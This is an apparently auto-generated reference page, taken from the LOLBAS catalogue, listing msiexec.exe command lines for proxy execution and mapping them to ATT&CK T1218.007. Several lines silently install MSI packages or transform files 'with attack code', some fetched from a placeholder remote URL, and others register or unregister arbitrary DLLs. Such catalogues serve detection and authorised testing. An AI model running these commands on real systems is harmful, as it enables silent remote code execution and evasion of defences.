---
parsed_by: focuslocust
source: commands
type: generated
---
# Msiexec Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Msiexec.exe

Tool page: [Msiexec.exe](../../tools/windows/msiexec.exe.md)

### Execute custom made msi file with attack code

```text
msiexec /quiet /i {PATH:.msi}
```

Description:

Installs the target .MSI file silently.

Related ATT&CK:

- [T1218.007](../../attack/techniques/T1218.007-msiexec.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml` |
| Evidence | Command preserved from source parser. |

### Execute custom made msi file with attack code from remote server

```text
msiexec /q /i {REMOTEURL}
```

Description:

Installs the target remote & renamed .MSI file silently.

Related ATT&CK:

- [T1218.007](../../attack/techniques/T1218.007-msiexec.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml` |
| Evidence | Command preserved from source parser. |

### Execute dll files

```text
msiexec /y {PATH_ABSOLUTE:.dll}
```

Description:

Calls DllRegisterServer to register the target DLL.

Related ATT&CK:

- [T1218.007](../../attack/techniques/T1218.007-msiexec.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml` |
| Evidence | Command preserved from source parser. |

### Execute dll files

```text
msiexec /z {PATH_ABSOLUTE:.dll}
```

Description:

Calls DllUnregisterServer to un-register the target DLL.

Related ATT&CK:

- [T1218.007](../../attack/techniques/T1218.007-msiexec.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml` |
| Evidence | Command preserved from source parser. |

### Install trusted and signed msi file, with additional attack code as transformation file, from a remote server

```text
msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
```

Description:

Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.

Related ATT&CK:

- [T1218.007](../../attack/techniques/T1218.007-msiexec.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml` |
| Evidence | Command preserved from source parser. |
